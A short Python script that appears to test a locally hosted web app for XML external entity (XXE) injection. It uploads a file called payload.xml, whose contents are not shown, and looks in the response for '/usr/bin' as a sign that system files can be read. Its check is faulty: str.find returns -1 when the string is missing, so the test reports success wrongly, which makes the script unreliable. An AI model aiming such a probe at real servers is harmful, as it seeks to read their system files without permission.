import requests
import time
import sys


site = "http://localhost:3000/"


def upload_file(file, site):
    files = {'file': open(file, 'rb')}
    response = requests.post(site, files=files)
    if (response.text.find("/usr/bin")) :
        print("xxe is possible!")

r = requests.get(site)
time.sleep(2)
print("The site is online")
upload_file("payload.xml", site + "file-upload")

#send a request to upload payload.xml and get the response

